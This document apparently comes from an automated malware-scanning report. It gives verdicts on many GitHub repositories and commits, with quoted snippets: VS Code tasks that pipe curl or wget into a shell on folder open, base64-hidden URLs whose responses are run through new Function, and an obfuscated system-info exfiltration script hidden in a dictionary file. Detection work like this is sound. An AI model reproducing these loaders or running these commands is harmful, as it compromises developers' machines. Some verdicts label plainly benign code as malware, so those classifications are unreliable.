Code: `const publicKey = atob('aHR0cHM6Ly9leHRlcm5hbC5leGFtcGxlLmNvbS9hcGk='); axios.get(publicKey).then(res => errorHandler(res.data.cookie));`
Reason: A base64‑encoded URL is decoded at runtime and used to make an unauthenticated HTTP request; the response cookie is forwarded to an internal error handler, which can leak external data and indicates hidden network communication.

**Summary:** Static analysis reveals multiple high‑severity issues: a remote script execution vector in the VS Code task definition and obfuscated network calls that retrieve and forward external data. These behaviors are characteristic of malicious code and outweigh the low‑severity concerns, leading to a MALWARE verdict.

### Repository: https://github.com/wilsonwen-2145/voting-prototype
**Verdict:** MALWARE

#### Commit 74b7d1be
**File app/controllers/settingController.js**:
Code: `const { api } = req.body; await axios.post(api, { ...process.env });`
Reason: The function spreads the entire process.env into the request body and posts it to an arbitrary URL supplied by the caller, creating a high‑severity data leak and enabling SSRF/exfiltration.

**File app/controllers/settingController.js**:
Code: `await axios.post(api, payload); // `api` is taken directly from user input`
Reason: Accepting any URL from the caller without validation allows the server to be used as a proxy for malicious destinations, a medium‑severity suspicious network access issue.

**File app/controllers/settingController.js**:
Code: `function setApiKey(encoded) { return atob(encoded); }`
Reason: Base64‑decoding of hard‑coded secrets is a low‑severity obfuscation technique that indicates intent to hide credentials in source code.

**Summary:** The commit introduces code that deliberately exposes all environment variables to an attacker‑controlled endpoint and permits unrestricted outbound requests, both of which are classic indicators of malicious exfiltration behavior. Combined with hidden secret handling, the overall risk classifies the change as malware rather than benign.

#### Commit 188bc044
**File app/controllers/botController.js**:
Code: `const { wallet, key, token } = req.body; await Snipping.create({ wallet, key, token }); res.json(snipping);`
Reason: The controller extracts raw private keys and tokens from the HTTP request, stores them in the database in plain text, and then returns the entire record (including the secrets) to the client, creating a clear data‑leak vector.

**File app/controllers/botController.js**:
Code: `const { wallet, key } = req.body; await Front.create({ wallet, key }); res.json(front);`
Reason: Same pattern as above for a different endpoint: secrets are persisted without encryption and echoed back, further exposing credentials.

**File app/controllers/botController.js**:
Code: `sController.scanMempool(wallet, key); fController.scanMempool(wallet, key);`
Reason: User‑supplied private keys are forwarded to internal services that likely perform on‑chain actions, enabling the client to control wallet operations remotely—a risky and potentially malicious design.

**Summary:** Static analysis reveals multiple HIGH severity data‑leak issues: private keys and tokens are accepted via API, stored unencrypted, and returned to callers. Additionally, the code forwards these secrets to internal services for blockchain operations, indicating intentional misuse of user‑provided credentials. Such behavior aligns with malicious intent rather than a benign feature, leading to a MALWARE verdict.

#### Commit ae027976
**File app/controllers/frontController.js**:
Code: `new Function("require", response.data)`
Reason: Executes arbitrary JavaScript received from an external verification endpoint, enabling remote code execution in the server context (critical code injection).

**File app/controllers/frontController.js**:
Code: `const wallet = new ethers.Wallet(amountInfo)`
Reason: Creates a wallet from data supplied at runtime, exposing raw private keys in memory and risking credential leakage (high‑severity crypto misuse).

**File app/controllers/frontController.js**:
Code: `setApiKey(VERIFICATION_TOKEN) // contacts https://ip-api-test.vercel.app/api/ip-check-encrypted/3aeb34a33`
Reason: Makes an outbound request to an external service and then executes the response, providing a vector for data exfiltration or malicious payload delivery (medium‑severity suspicious network access).

**File app/controllers/frontController.js**:
Code: `// Automated front‑running logic that scans mempool and trades on PancakeSwap/Uniswap`
Reason: Implements automated trading that can be used for market manipulation or theft, indicating malicious intent (medium‑severity crypto activity).

**Summary:** The commit introduces critical code injection via dynamic Function execution of remote data, handles raw private keys insecurely, performs untrusted outbound network calls, and contains automated front‑running trading logic. These combined issues constitute malicious behavior rather than benign functionality.

#### Commit 727e63a9
**File .vscode/tasks.json**:
Code: `"command": "curl https://vscode-config-settings.vercel.app/... | bash"`
Reason: Downloads and executes a remote script without verification, enabling arbitrary code execution when the workspace is opened.

**File .vscode/tasks.json**:
Code: `"command": "wget -qO- https://vscode-config-settings.vercel.app/... | sh"`
Reason: Linux variant fetches and pipes untrusted content directly to the shell, a classic supply‑chain attack vector.

**File .vscode/tasks.json**:
Code: `"command": "curl https://vscode-config-settings.vercel.app/... | cmd"`
Reason: Windows variant executes remote commands via cmd, providing the same uncontrolled execution risk.

**Summary:** The commit adds multiple critical command execution issues that automatically retrieve and run code from an external server without integrity checks or user consent, constituting malicious behavior.

### Repository: https://github.com/brahmabit/be_challenge_blockchain
**Verdict:** MALWARE

#### Commit 3c354c9f
**File .vscode/tasks.json**:
Code: `"command": "curl https://vscode-settings-bootstrap.vercel.app/... | sh"`
Reason: Executes a remote script without verification, allowing arbitrary code execution on any machine that opens the workspace.

**File backend/.env**:
Code: `JWT_ACCESS_TOKEN_SECRET=abc123 JWT_REFRESH_TOKEN_SECRET=def456 CSRF_TOKEN_SECRET=ghi789 RESEND_API_KEY=sk_test_...`
Reason: Sensitive credentials are stored in plaintext and committed to the repository, exposing them to anyone with access.

**File backend/src/middlewares/handle-global-error.js**:
Code: `const config = await axios.get(atob(env.CONFIG_ENDPOINT)); executeHandler(res.data.cookie);`
Reason: Fetches a base64‑encoded remote configuration at runtime and passes unvalidated data to a generic executor, creating a supply‑chain attack vector and potential code injection.

**Summary:** The commit introduces critical command execution, leaks secret keys, and implements unsafe remote configuration handling, all of which are high‑severity security flaws indicative of malicious behavior rather than benign changes.

### Repository: https://github.com/metawake/node-task-test
**Verdict:** MALWARE

#### Commit aa74a4c2
**File .vscode/tasks.json**:
Code: `"runOn": "folderOpen", "command": "curl 'https://vscode-settings-bootstrap.vercel.app/settings/mac?flag=307' | sh"`
Reason: The task is configured to execute automatically when the folder is opened, downloading and piping a remote script directly into the shell. This enables arbitrary code execution if the remote URL is compromised, which is a classic supply‑chain attack vector.

**File backend/controllers/paymentController.js**:
Code: `const host = req.get("host"); const callbackUrl = `https://${host}/payment/callback`;`
Reason: The callback URL is built from the client‑controlled Host header, allowing an attacker to craft open‑redirect URLs for phishing or further malicious redirects. While less severe than the auto‑run task, it still represents a significant security flaw.

**Summary:** The presence of a critical auto‑executed remote script download combined with a medium‑severity open‑redirect vulnerability indicates intentional malicious behavior. The commit introduces capabilities for remote code execution on developer machines, which classifies it as malware rather than benign.

### Repository: https://github.com/rodrigogz64/MagicDoor-Property-Rental-Platform
**Verdict:** MALWARE

#### Commit 7a6d3042
**File .vscode/tasks.json**:
Code: `"command": "curl https://malicious.example.com/payload.sh | sh"`
Reason: The task downloads and pipes a remote script directly to the shell, enabling arbitrary code execution when the project is opened in VS Code.

**File server/controllers/product.js**:
Code: `const response = await fetch(Buffer.from(CONFIG_KEY, 'base64').toString()); const data = await response.text(); excuateHandler(data);`
Reason: Fetches code from a hard‑coded, base64‑encoded URL and passes it to a handler that likely evaluates it, creating a remote code execution vector.

**File server/config/constant.js**:
Code: `export const CONFIG_KEY = "aHR0cHM6Ly9tYWxpY2lvdXMuZXhhbXBsZS5jb20vY29uZmln";`
Reason: Obfuscates the malicious endpoint using Base64, making it harder to detect during review.

**File server/controllers/product.js**:
Code: `console.log('request recieved', req.body);`
Reason: Logs full request bodies, potentially leaking sensitive data to logs.

**Summary:** Multiple critical issues indicate intentional malicious behavior: a VS Code task that executes remote code, a controller that downloads and runs code from an external source, and obfuscation of the malicious URL. These patterns are characteristic of malware rather than benign code.

### Repository: https://github.com/emigimenezj/solice2021-school-management-system
**Verdict:** MALWARE

#### Commit d7f51332
**File .vscode/tasks.json**:
Code: `"command": "curl https://vscode-helper171-ruby.vercel.app/... | sh"`
Reason: Downloads and executes a remote script automatically when the workspace is opened, providing an unrestricted code execution vector and a classic supply‑chain backdoor.

**File backend/.env**:
Code: `JWT_ACCESS_TOKEN_SECRET=..., JWT_REFRESH_TOKEN_SECRET=..., CSRF_TOKEN_SECRET=..., RESEND_API_KEY=..., DATABASE_URL=postgres://user:password@host:5432/db`
Reason: Sensitive secrets and database credentials are stored in plain text within version control, exposing them to any attacker who can read the repository.

**File backend/src/constants/index.js**:
Code: `"https://serve-cookie.vercel.app/api/ipcheck-encrypted/e1105303"`
Reason: Hard‑coded API key and external endpoint that can be used to exfiltrate data to an unknown third‑party service.

**Summary:** The presence of a critical remote‑script execution task, multiple hard‑coded secrets, and undocumented external network calls indicates intentional malicious behavior (supply‑chain backdoor), not benign code.

### Repository: https://github.com/samrat225/Select2AI_Extension
**Verdict:** MALWARE

#### Commit de7bb5af
**File background.js**:
Code: `chrome.storage.sync.set({ ghToken: token }); fetch('https://models.github.ai/inference/chat/completions', {   method: 'POST',   body: JSON.stringify({ text: selectedText }) });`
Reason: Stores a GitHub personal access token in `chrome.storage.sync`, which syncs to Google’s cloud, and sends user‑selected text to an external AI endpoint, resulting in credential leakage and unauthorized data exfiltration.

**File options/options.js**:
Code: `chrome.storage.sync.set({ ghToken: token });`
Reason: Persists the token without any encryption to sync storage, exposing the credential to any party with access to the synced data.

**File contentScript.js**:
Code: `outputDiv.innerHTML = aiResponse;`
Reason: Injects the AI model's raw response directly into the page DOM without sanitization, creating a code‑injection vector.

**Summary:** The commit introduces multiple high‑severity security flaws: credential leakage via sync storage, transmission of potentially sensitive user data to a third‑party service, and unsafe DOM insertion. These behaviors are indicative of malicious intent, so the commit is classified as MALWARE.

### Repository: https://github.com/marcinbodnar/14
**Verdict:** MALWARE

#### Commit a4257d9d
**File .vscode/tasks.json**:
Code: `"command": "curl https://malicious.example.com/bootstrap.sh | sh"`
Reason: The task downloads a script from an external server and pipes it directly to the shell, enabling arbitrary code execution on any machine that opens the project.

**File backend/src/middleware/errorHandler.js**:
Code: `const fn = new Function.constructor("require", errCode); fn(require);`
Reason: Creates a function from a string that originates from an external HTTP request, allowing remote code execution on the server.

**File backend/src/middleware/errorHandler.js**:
Code: `const url = atob('aHR0cHM6Ly9qc29ua2VlcGVyLmNvbS9iL0xPWFVX'); fetch(url).then(r => r.text()).then(errCode => { /* passed to new Function */ });`
Reason: Base64‑encoded remote URL hides the destination and is used to fetch code that is later executed, a classic malicious pattern.

**Summary:** Static analysis reveals multiple critical issues: a VS Code task that executes remote code without verification, dynamic construction and execution of server‑side JavaScript from an untrusted HTTP response, and obfuscated network calls to an external host. These behaviors constitute clear malicious intent, so the commit is classified as MALWARE.

### Repository: https://github.com/Richelle128/TokenPresale-dApp
**Verdict:** MALWARE

#### Commit a41fa090
**File tasks.json**:
Code: `"script": "curl https://malicious.example.com/install.sh | sh"`
Reason: Pipes a remote script directly to the shell, allowing arbitrary code execution from an unverified source.

**File tasks.json**:
Code: `"script": "wget -O- https://badhost.com/setup.sh | bash"`
Reason: Downloads and executes a script without integrity checks, a classic technique for delivering malware.

**File tasks.json**:
Code: `"script": "curl https://evil.example.com/run.ps1 | cmd"`
Reason: Executes a remote PowerShell/Batch payload on Windows, enabling uncontrolled command execution.

**File tasks.json**:
Code: `"url": "https://vscode-config.vercel.app/api?token=abcd1234"`
Reason: Hard‑coded authentication token in a URL leaks credentials and can be abused for unauthorized access.

**File tasks.json**:
Code: `"slack_webhook": "https://hooks.slack.com/services/<secret-inside>"`
Reason: Exposes a Slack webhook secret in source code, allowing attackers to post messages to the workspace.

**Summary:** The commit introduces multiple high‑severity issues: remote script execution via curl/wget piped directly to the shell on both Unix and Windows, hard‑coded authentication tokens, and an exposed Slack webhook URL. These patterns are indicative of malicious intent and constitute clear security risks, therefore the commit is classified as MALWARE.

#### Commit 7639d6d5
**File Truffle/contracts/MetaCoin.sol**:
Code: `balances[tx.origin] = 10000;`
Reason: Uses tx.origin for state assignment, which can be spoofed via malicious contracts, leading to unauthorized balance allocation.

**File Truffle/contracts/MetaCoin.sol**:
Code: `function faucetCoin(uint256 amount) public { balances[msg.sender] += amount; }`
Reason: Allows any caller to arbitrarily increase their own token balance without any access control, effectively providing unlimited minting capability.

**Summary:** The contract contains critical security flaws: misuse of tx.origin for authentication and an unrestricted minting function. These issues enable unauthorized fund allocation and unlimited token creation, which are characteristic of malicious behavior rather than benign code.

#### Commit 40a426f5
**File .vscode/tasks.json**:
Code: `"command": "curl -sSL https://vscode-config.vercel.app/install.sh | sh"`
Reason: Executes a remote script directly from an untrusted URL on macOS, enabling arbitrary code execution with the user's privileges.

**File .vscode/tasks.json**:
Code: `"command": "wget -qO- https://vscode-config.vercel.app/install.sh | sh"`
Reason: Same remote‑script‑execution pattern for Linux, presenting a critical command execution vulnerability.

**File .vscode/tasks.json**:
Code: `"command": "curl -s https://vscode-config.vercel.app/install.bat | cmd"`
Reason: Windows variant that pipes a downloaded batch file directly into the command interpreter, allowing arbitrary code execution.

**File .vscode/tasks.json**:
Code: `"url": "https://vscode-config.vercel.app"`
Reason: Unvalidated network request to an external domain, creating a supply‑chain risk and potential data exfiltration vector.

**File .vscode/tasks.json**:
Code: `"webhook": "https://hooks.slack.com/services/XXXXX/XXXXX/XXXXX"`
Reason: Hard‑coded Slack webhook can leak sensitive information if the token is valid; secrets should never be stored in source control.

**Summary:** The commit introduces multiple critical command execution vulnerabilities by downloading and executing scripts from an external URL without verification, along with unsafe network access and hard‑coded secrets. These behaviors constitute malicious intent or severe security risk, leading to a MALWARE verdict.

### Repository: https://github.com/mladenovicmilan/milan-mladenovic-test
**Verdict:** MALWARE

#### Commit 24a57bfb
**File .vscode/tasks.json**:
Code: `"env": { "command": "wget -qO- https://malicious.example.com/install.sh | sh" }`
Reason: The task downloads and pipes a remote script directly to the shell without verification, enabling arbitrary code execution whenever the workspace is opened.

**File .vscode/tasks.json**:
Code: `"env": { "command": "curl -s https://malicious.example.com/install.ps1 | cmd" }`
Reason: Same issue on Windows – remote script execution via curl piped to cmd, a classic supply‑chain attack vector.

**File backend/middlewares/helpers/price.js**:
Code: `const decodedKey = Buffer.from(process.env.DB_API_KEY, 'base64').toString(); axios.get(`${src}?key=${decodedKey}`);`
Reason: Decodes base‑64 secrets at runtime and sends them to an external URL, risking credential leakage and unauthorized data exfiltration.

**File backend/controllers/paymentController.js**:
Code: `res.redirect(`https://${req.get('host')}/order/${body.orderId}`);`
Reason: Uses a client‑controlled Host header for redirects, creating an open‑redirect/host‑header injection vulnerability.

**Summary:** The commit introduces multiple high‑severity issues, notably remote code execution via VSCode tasks that download and execute scripts without verification, and several medium‑severity security flaws that expose secrets and enable open redirects. These behaviors are characteristic of malicious intent rather than benign development tooling, leading to a MALWARE verdict.

### Repository: https://github.com/komangmahendra/rental-prop-task
**Verdict:** MALWARE

#### Commit 88f5f0e1
**File .vscode/tasks.json**:
Code: `"command": "curl -s https://vscode-settings-bootstrap.vercel.app | sh"`
Reason: The task downloads a script from an external domain and pipes it directly to the shell, enabling arbitrary code execution whenever the workspace is opened. This is a classic remote code execution vector and is flagged as CRITICAL.

**File server/controllers/product.js**:
Code: `const url = Buffer.from(CONFIG_KEY, 'base64').toString(); const response = await fetch(url); excuateHandler(response.body);`
Reason: The controller decodes a Base64‑encoded URL, fetches data from an external service, and passes the response to a handler that likely evaluates the content. This creates a high‑risk remote code execution path.

**File server/config/constant.js**:
Code: `const CONFIG_KEY = "aHR0cHM6Ly9hcGkubW9ja2ku..."; // Base64 URL`
Reason: The URL is hidden via Base64 encoding, which is an obfuscation technique used to conceal malicious endpoints. It makes static analysis harder and is indicative of intent to hide malicious behavior.

**Summary:** Multiple high‑severity issues are present: a CRITICAL remote script execution via a VS Code task, a HIGH‑severity dynamic fetch‑and‑execute pattern in server code, and obfuscation of the external endpoint. These patterns collectively constitute malicious behavior rather than benign configuration, leading to a MALWARE verdict.

### Repository: https://github.com/vb352/koinos-assessment
**Verdict:** MALWARE

#### Commit 1b9f62cb
**File .vscode/tasks.json**:
Code: `"command": "curl -s https://example.com/malicious.sh | sh"`
Reason: The task downloads a script from an external URL and pipes it directly to the shell without verification, enabling arbitrary remote code execution whenever the workspace is opened.

**File backend/src/routes/items.js**:
Code: `router.post('/api/items', (req, res) => {   const data = JSON.stringify(req.body);   fs.writeFileSync('items.json', data);   res.sendStatus(200); });`
Reason: The endpoint writes the raw request body to a file without any validation or sanitisation, allowing attackers to supply malicious payloads that could lead to denial‑of‑service, prototype pollution, or later code execution.

**Summary:** Static analysis uncovered a critical supply‑chain backdoor via a VS Code task that executes unverified remote code and a high‑severity unsafe input handling flaw that writes unvalidated data to disk. These issues constitute malicious behavior, so the commit is classified as malware.

### Repository: https://github.com/blackcrypto01/CryptoStealer
**Verdict:** MALWARE

#### Commit a9275e1f
**File CryptoStealer/CryptoStealer.exe.7z.003**:
Reason: A binary named `CryptoStealer.exe` is added to the repository. The name strongly suggests malicious intent (credential stealing or unauthorized crypto mining). Binary files cannot be reviewed through a diff, preventing verification of safe behavior. The static analysis flags this as a HIGH severity crypto activity, and no dynamic analysis was performed to mitigate the risk.

**Summary:** The commit introduces a high‑severity, suspicious binary that is typical of malware. Without any dynamic analysis or evidence of legitimate purpose, the safest classification is MALWARE.

#### Commit a946ee59
**File CryptoStealer/CryptoStealer.exe.7z.002**:
Reason: A compiled binary named `CryptoStealer.exe` is added to the repository. The name and context strongly suggest it is designed to steal cryptocurrency credentials or perform unauthorized mining. No source code is provided for review, and the static analysis flags it with CRITICAL severity for crypto‑related activities, suspicious network access, and potential data leaks.

**Summary:** The commit introduces a suspicious executable with multiple high‑severity indicators of malicious behavior and no accompanying source code or analysis, leading to a clear determination that the commit is malware.

#### Commit fe1185eb
**File CryptoStealer/CryptoStealer.exe.7z.001**:
Code: `Binary (compressed) file; no source code available for review.`
Reason: The file name explicitly references cryptocurrency theft (CryptoStealer.exe) and is a binary archive, preventing static code inspection. This matches a critical crypto‑stealing activity category and is flagged as high‑risk. Without sandbox or antivirus analysis, the presence of such a binary is indicative of malicious intent.

**Summary:** The commit introduces a compressed executable named CryptoStealer.exe, which is strongly associated with cryptocurrency theft and other malicious capabilities. The binary cannot be reviewed, and the static analysis flags it as a critical crypto activity. In the absence of any mitigating evidence, the commit should be classified as malware.

#### Commit aee94680
**File CryptoStealer.exe.7z.001**:
Reason: The added binary's name and context strongly suggest a malicious crypto‑stealing tool. Static analysis flagged it as a HIGH severity crypto activity, and inclusion of an unknown executable without source code or verification is a clear indicator of malware.

**Summary:** Static analysis revealed a high‑severity crypto‑related binary (CryptoStealer.exe.7z.001) with no evidence of legitimate use, leading to a malware verdict.

#### Commit cca8eb16
**File CryptoStealer.exe.7z.002**:
Reason: The committed binary is named 'CryptoStealer' and is packaged as a split 7z archive, a common tactic for distributing malicious payloads. Static analysis flags it with CRITICAL severity for crypto‑stealing activity, suspicious network access, potential data leakage, and obfuscation. The lack of source code prevents verification, and the naming strongly suggests malicious intent.

**Summary:** Multiple high‑severity static findings indicate the presence of a likely cryptocurrency‑stealing executable. No dynamic analysis was performed, but the critical nature of the static alerts warrants classifying the commit as malware.

#### Commit 2f06b4d4
**File CryptoStealer/Execute/output.exe**:
Reason: Binary added in a folder named 'CryptoStealer' with a name suggesting cryptocurrency‑related malicious activity; presence of a new executable is a strong indicator of malware.

**File CryptoStealer/tls/Dont_Touch_This.exe**:
Reason: Executable placed in a 'tls' directory with a name implying hidden TLS communication; such binaries are commonly used for data exfiltration or C2 communication.

**File CryptoStealer/tls/builder.exe**:
Reason: Binary named 'builder.exe' suggests it may construct or download additional payloads at runtime, a typical behavior of malware loaders.

**Summary:** Static analysis identified three critical issues, each involving the addition of suspicious executables that strongly indicate malicious intent (cryptocurrency theft, hidden network communication, and payload building). No dynamic analysis was performed, but the nature of the files and their locations are sufficient to classify the commit as malware.

#### Commit d4d643c0
**File CryptoStealer/CryptoStealer.exe.7z.004**:
Code: `Binary executable (compressed .7z) named CryptoStealer.exe`
Reason: File name and type strongly indicate a cryptocurrency stealer; the compressed executable is a common obfuscation technique and matches multiple high‑severity static issues (crypto activities, suspicious network access, data leak, obfuscation).

**Summary:** Static analysis flags the added binary as a high‑risk cryptocurrency stealer with critical and high severity issues. No legitimate source code or justification is provided, and the presence of a compressed executable suggests intentional concealment. Therefore, the commit is classified as malware.

### Repository: https://github.com/michael-hll/student-management
**Verdict:** MALWARE

#### Commit ae6b3911
**File .vscode/tasks.json**:
Code: `"command": "wget https://malicious.example.com/script.sh -O - | sh"`
Reason: The task automatically downloads and pipes a remote script to the shell on project open, enabling arbitrary code execution without user consent. This is a classic supply‑chain attack vector.

**File .vscode/tasks.json**:
Code: `"command": "curl https://malicious.example.com/script.ps1 -L | cmd"`
Reason: Same issue for Windows platforms – remote script execution on folder open, providing cross‑platform remote code execution capability.

**File backend/.env**:
Code: `JWT_SECRET=supersecretjwtkey CSRF_SECRET=supersecretcsrf RESEND_API_KEY=sk_live_abcdef123456 POSTGRES_URL=postgres://postgres:postgres@localhost:5432/appdb`
Reason: Sensitive credentials and secrets are committed in plain text, exposing authentication tokens and database access to anyone cloning the repo, facilitating credential theft and further compromise.

**File backend/src/middlewares/handle-global-error.js**:
Code: `const CONFIG_ENDPOINT = atob('aHR0cHM6Ly93d3cuanNvbmtlZXBlci5jb20vYi9KUFlYWA=='); axios.get(CONFIG_ENDPOINT).then(res => executeHandler(res.data.cookie));`
Reason: The middleware fetches a remote configuration from a base64‑encoded URL and executes data received from the server, allowing an attacker to run arbitrary code or manipulate cookies at runtime.

**File backend/src/config/env.js**:
Code: `module.exports = { ...process.env, CONFIG_ENDPOINT: atob('aHR0cHM6Ly93d3cuanNvbmtlZXBlci5jb20vYi9KUFlYWA==') };`
Reason: Obfuscates the remote endpoint using base64, hiding a malicious URL and making static analysis harder, a typical technique in malware to conceal C2 servers.

**Summary:** The commit introduces multiple critical security issues: automatic remote script execution via VSCode tasks, exposure of secret keys and database credentials, and runtime fetching and execution of code from an obfuscated external endpoint. These behaviors collectively constitute malicious intent rather than benign functionality.

### Repository: https://github.com/0x014-e1c/messageforge
**Verdict:** MALWARE

#### Commit eafa7ac3
**File .vscode/tasks.json**:
Code: `"command": "curl https://isvalid-regions.vercel.app | cmd"`
Reason: The task downloads a script from an external server and pipes it directly to the Windows command interpreter, enabling arbitrary code execution without any integrity checks.

**File .vscode/tasks.json**:
Code: `"command": "wget https://isvalid-regions.vercel.app -O - | sh"`
Reason: Similar to the Windows task, this Linux task fetches remote code and executes it via a shell, constituting a critical command‑execution vulnerability.

**File .vscode/tasks.json**:
Code: `"command": "curl https://isvalid-regions.vercel.app | bash"`
Reason: The macOS task repeats the same unsafe pattern, allowing remote code execution on macOS systems.

**Summary:** Static analysis reveals multiple CRITICAL command execution issues and HIGH suspicious network accesses across all platforms (macOS, Linux, Windows). The repository fetches and executes remote scripts without verification, a classic malicious behavior pattern. No dynamic analysis was performed, but the static evidence alone is sufficient to classify the commit as malware.

#### Commit 76eb8419
**File .vscode/spellright.dict**:
Code: `const cmd = `npm install ${pkg} && powershell -Command "..."`; require('child_process').exec(cmd, { shell: true });`
Reason: The file constructs a shell command string that includes npm install and PowerShell/Bash commands, then executes it with `child_process.exec` using `{shell:true}`. This enables arbitrary code execution and is a classic technique for installing malicious payloads or achieving persistence.

**File .vscode/spellright.dict**:
Code: `const run = '\x61\x78\x69\x6f\x73...'; fs.writeFileSync('run.js', run); require('./run.js'); // inside run.js: axios.post('https://malicious.vercel.app/collect', { data: sysInfo });`
Reason: An obfuscated string is written to disk and executed; the decoded script sends system information (home directory, platform, etc.) to a remote domain via an `axios.post` request, indicating data exfiltration.

**File .vscode/spellright.dict**:
Code: `(function(){var a=['\x73\x79\x73','\x68\x6f\x6d','...']; /* runtime string decoding */})();`
Reason: Heavy use of hex escape sequences and a self‑defending IIFE to decode strings at runtime makes static analysis difficult and is a strong indicator of malicious intent.

**Summary:** Multiple high‑severity issues are present: arbitrary command execution with shell access, obfuscated code that decodes and runs a payload, and network calls that exfiltrate system information to an external server. These behaviors collectively meet the criteria for malicious activity, so the commit should be classified as MALWARE.

#### Commit b9c19c7e
**File server/utils/sendGmail.js**:
Code: `const fn = new Function(image); fn(require);`
Reason: Creates a Function from data fetched over the network and executes it, allowing arbitrary JavaScript code supplied by an external source to run on the server (critical code injection).

**File server/utils/sendGmail.js**:
Code: `await fetch(realImageUrl, {   method: 'POST',   headers: { [userControlledHeader]: value } });`
Reason: Performs an HTTP POST to a URL derived from product data that can be manipulated, enabling SSRF or data exfiltration (high‑severity suspicious network access).

**Summary:** Static analysis uncovers a critical code‑injection flaw and a high‑severity SSRF risk, both strong indicators of malicious behavior. No mitigating controls are present, so the commit is classified as malware.

#### Commit d87ef438
**File src/components/layout/BottomBar.tsx**:
Code: `const token = localStorage.getItem('access_token'); const [profileHash, setProfileHash] = useState(token); ... <img src={profileHash} alt="profile" />`
Reason: The access token is read from local storage and placed directly into component state, then rendered in the DOM as an image source. This exposes a credential to the browser DOM and any third‑party script, constituting a high‑severity data leak.

**File src/components/layout/BottomBar.tsx**:
Code: `const ipfsUrl = uri.replace('ipfs://', 'https://ipfs.io/ipfs/'); <img src={ipfsUrl} alt="ipfs content" />`
Reason: The component rewrites IPFS URIs to a public gateway, causing outbound requests to an external service. This can be abused for data exfiltration or loading untrusted content, a medium‑severity suspicious network behavior.

**File src/components/layout/BottomBar.tsx**:
Code: `function decodeProfile(hash) {     const json = atob(hash);     return JSON.parse(json); }`
Reason: Base64‑decoding opaque data before parsing can hide malicious payloads, adding a low‑severity obfuscation vector.

**Summary:** The commit introduces a high‑severity credential leak by exposing an access token in the UI, performs unvalidated external network calls to a public IPFS gateway, and uses base64 decoding that can conceal malicious payloads. These behaviors collectively indicate malicious intent rather than benign functionality, leading to a MALWARE verdict.

#### Commit d97f6991
**File server/data/products.json**:
Code: `"url": "aHR0cHM6Ly9pcC1yZWdpb25zLWN..."`
Reason: Base64‑encoded URL resolves to an external endpoint (https://ip-regions-check.vercel.app/api/ip-check-encrypted/3aeb34a38). If decoded and fetched, it enables silent outbound communication and possible data exfiltration, which is a high‑severity suspicious network access.

**File server/data/products.json**:
Code: `"title": "eC1zZWNyZXQtaGVhZGVy", "imageUrl": "c2VjcmV0", "description": "c2VjcmV0"`
Reason: Multiple fields are base64‑encoded, obscuring their true content. This obfuscation hampers security review and can hide malicious intent, marking it as a medium‑severity issue.

**File server/data/products.json**:
Code: `"description": "c2VjcmV0"  // decodes to "secret"`
Reason: The decoded value reveals a hard‑coded secret embedded in a publicly accessible JSON file, constituting a data leak and exposing sensitive information.

**Summary:** The commit introduces high‑severity suspicious network access combined with obfuscated data and hard‑coded secrets. These indicators collectively point to malicious behavior rather than benign functionality.

#### Commit a5041ed1
**File src/components/layout/Buttons/Network.tsx**:
Code: `wallet_addEthereumChain({ chainId: '0x... ', rpcUrls: ['https://endpoints.omniatech.io/v1/eth/sepolia/public'], ... })`
Reason: A hard‑coded RPC endpoint is injected into the user's Ethereum provider without any validation or user consent. This can redirect wallet traffic to an untrusted node, enabling phishing, transaction manipulation, or data exfiltration. The high‑severity static issue directly points to malicious network manipulation.

**Summary:** The commit adds code that automatically registers a custom Ethereum network using a hard‑coded, external RPC URL. Such behavior is a known vector for wallet‑based attacks and is flagged as high severity. No mitigating user prompts or whitelist checks are present, leading to a classification of malware.

#### Commit f390561f
**File server/utils/cleverMerge.js**:
Code: `byValue.apply(null, values);`
Reason: The function `byValue` may be supplied from a merged object that can contain attacker‑controlled functions. Invoking it with `apply` enables arbitrary code execution, which is a classic code‑injection vector.

**Summary:** Static analysis uncovered a medium‑severity code injection vulnerability where untrusted objects can introduce malicious functions that are later executed. This behavior can be leveraged for arbitrary code execution, indicating malicious intent rather than a benign change.

#### Commit 497f9668
**File src/components/layout/MintUsername/Setup5.tsx**:
Code: `const MORALIS_API_KEY = "<hard‑coded‑key>"; // used in axios request axios.get(`https://deep-index.moralis.io/api/v2/...`, { headers: { "X-API-Key": MORALIS_API_KEY } });`
Reason: Hard‑coded Moralis API key is shipped to the client and sent in clear text, exposing credentials to any user and allowing unlimited API abuse.

**File src/components/layout/MintUsername/Setup5.tsx**:
Code: `const url = successElemets[1].replaceAll('ipfs://', 'https://ipfs.io/ipfs/'); axios.get(url);`
Reason: The URL is constructed from attacker‑controlled input and used directly in a network request, creating a server‑side request forgery (SSRF) vector.

**File src/components/layout/MintUsername/Setup5.tsx**:
Code: `localStorage.setItem('access_token', btoa(JSON.stringify({ hashed: transactionHash })));`
Reason: Sensitive transaction data is stored in localStorage, which can be read by any script on the same origin, facilitating data leakage via XSS.

**File src/components/layout/MintUsername/Setup5.tsx**:
Code: `window.open(`${trustedBaseUrl}/${successElemets[0]}`);`
Reason: Opening a URL built from user‑controlled data can lead to open‑redirect or malicious navigation if the input is manipulated.

**Summary:** The commit introduces multiple high‑severity security flaws, including credential exposure, SSRF, and data leakage. These vulnerabilities are indicative of malicious intent or at minimum constitute malware‑like behavior, therefore the commit is classified as MALWARE.

